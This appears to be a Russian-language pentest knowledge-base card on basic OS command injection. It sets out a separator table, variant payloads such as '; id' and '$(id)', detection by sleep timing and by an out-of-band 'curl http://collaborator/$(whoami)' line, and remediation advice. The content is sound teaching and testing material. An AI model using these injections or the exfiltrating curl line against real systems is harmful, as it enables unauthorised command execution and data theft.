---
id: cmdi-basic-chained-commands
title: "Command injection: базовая цепочка команд"
type: cmdi
target: linux
category: web
difficulty: beginner
bypass: none
tags: [cmdi, shell, linux]
tested_on: ["bash", "sh (dash)"]
success_rate: 0.7
risk: high
cwe: "CWE-78"
lab: null
last_verified: "2026-10-23"
references:
  - "https://owasp.org/www-community/attacks/Command_Injection"
graph:
  - target: "cmdi"
    type: instance_of
  - target: "rce"
    type: leads_to
---

# Command injection: базовая цепочка команд

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
; id
```

## Explanation

Если приложение передаёт пользовательские данные в shell (`os.system`, `subprocess(shell=True)`,
backticks в PHP, `Runtime.exec` со строкой), разделители команд позволяют добавить свою:

| Разделитель | Эффект |
|-------------|--------|
| `;` | выполнить следующее независимо |
| `&&` | выполнить, если предыдущее успешно |
| `\|\|` | выполнить, если предыдущее провалилось |
| `\|` | передать вывод в следующую команду |
| `&` | выполнить в фоне |
| `` ` `` / `$( )` | подстановка вывода команды |

`id` — безопасная диагностика: показывает uid/gid/группы, ничего не меняя.

## Detection

1. Внесите `; sleep 5` или `| sleep 5` и измерьте время ответа — самый надёжный
   индикатор при слепом выводе.
2. Подстановка: `$(echo HBMARK)` — метка в ответе.
3. OOB: `; curl http://collaborator/$(whoami)` (только в лабе).
Инструменты: `commix`, Burp Intruder с набором разделителей.

## Remediation

- Не вызывать shell: `subprocess.run([...], shell=False)`, `execve`, массивы аргументов.
- Если shell обязателен — whitelist символов и значений, `shlex.quote()`.
- Отдельный сервис с минимальными правами (не root), read-only ФС, без утилит в образе.
- Таймауты и лимиты; запрет исходящих соединений из воркера.

## Variants

```
| id
```

```
&& id
```

```
|| id
```

```
`id`
```

```
$(id)
```
